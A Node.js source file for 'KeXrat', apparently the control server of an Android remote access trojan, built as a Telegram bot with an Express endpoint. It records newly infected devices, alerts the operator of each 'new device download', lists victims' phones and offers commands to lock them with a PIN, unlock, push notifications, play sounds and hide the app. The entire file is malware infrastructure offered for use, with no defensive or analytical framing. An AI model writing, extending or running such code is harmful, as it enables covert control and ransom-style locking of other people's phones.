const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

// Configuration
const TOKEN = process.env.BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(TOKEN, { polling: true });
const app = express();
app.use(bodyParser.json());

// In-memory connected devices store
const connectedDevices = new Map();

bot.onText(/\/hello/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name || 'User';
    bot.sendMessage(chatId, `HELLO ${username}\nWelcome To KeXrat`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'LIST DEVICE', callback_data: 'list_devices' }]
            ]
        }
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    if (data === 'list_devices') {
        if (connectedDevices.size === 0) {
            bot.sendMessage(chatId, 'No devices connected yet.');
        } else {
            const keyboard = [];
            connectedDevices.forEach((device, deviceId) => {
                keyboard.push([{ text: device.brand || 'Android Device', callback_data: `select_device_${deviceId}` }]);
            });
            bot.sendMessage(chatId, 'Select connected device:', {
                reply_markup: { inline_keyboard: keyboard }
            });
        }
    } else if (data.startsWith('select_device_')) {
        const deviceId = data.replace('select_device_', '');
        bot.sendMessage(chatId, `Selected device: ${deviceId}\nCommands available:\n/Lock [pin]\n/Unlock\n/Notify [msg]\n/Sound\n/Ssound\n/Hide`);
    }
    bot.answerCallbackQuery(query.id);
});

// Endpoint for app to register download / connection
app.post('/api/register', (req, res) => {
    const { deviceId, brand, telegramId } = req.body;
    connectedDevices.set(deviceId, { brand, telegramId, lastSeen: Date.now() });
    
    if (telegramId) {
        bot.sendMessage(telegramId, `NEW DEVICE DOWNLOAD ✅\nBrand: ${brand}`);
    }
    res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`KEXRAT CONTROL Server running on port ${PORT}`);
});
